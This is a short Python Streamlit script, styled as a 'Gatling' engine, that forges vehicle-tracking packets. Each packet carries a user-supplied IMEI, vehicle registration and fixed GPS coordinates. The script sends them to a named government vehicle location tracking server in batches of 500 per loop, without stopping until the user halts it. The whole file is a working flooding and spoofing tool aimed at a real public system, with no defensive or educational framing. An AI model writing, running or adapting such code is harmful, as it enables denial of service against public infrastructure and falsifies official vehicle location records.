import streamlit as st
import socket
import time
from datetime import datetime

# --- Page Config ---
st.set_page_config(page_title="GATLING NITRO V101", layout="wide")
st.markdown("<style>.main { background-color: #000; color: #0f0; }</style>", unsafe_allow_html=True)

st.title("🚀 GATLING NITRO V101")
st.caption("Pure Network Engine - Zero Error Mode")

# --- Session States ---
if 'firing' not in st.session_state: st.session_state.firing = False
if 'count' not in st.session_state: st.session_state.count = 0

# --- Inputs ---
with st.sidebar:
    st.header("Settings")
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VNO", "BR04GA5974")
    mode = st.radio("MODE", ["UDP", "TCP"])

c1, c2 = st.columns(2)
if c1.button("🔥 START ENGINE"):
    st.session_state.firing = True
    st.rerun()
if c2.button("🛑 STOP ENGINE"):
    st.session_state.firing = False
    st.rerun()

st.divider()
m = st.empty()

# --- Execution Engine ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode=="UDP" else socket.SOCK_STREAM)
    
    if mode == "TCP":
        sock.settimeout(2)
        try: sock.connect(target)
        except: st.error("TCP Connection Failed")
    
    while st.session_state.firing:
        now = datetime.now()
        # Clean Packet Construction
        pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},25.6501,N,84.7851,E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode()
        
        # Super Batch Firing
        for _ in range(500):
            sock.sendto(pkt, target) if mode=="UDP" else sock.send(pkt)
            st.session_state.count += 1
        
        m.metric("TOTAL PACKETS SENT", f"{st.session_state.count:,}")
        time.sleep(0.1) # UI Refresh gap
    sock.close()
else:
    m.metric("TOTAL PACKETS SENT", f"{st.session_state.count:,}")
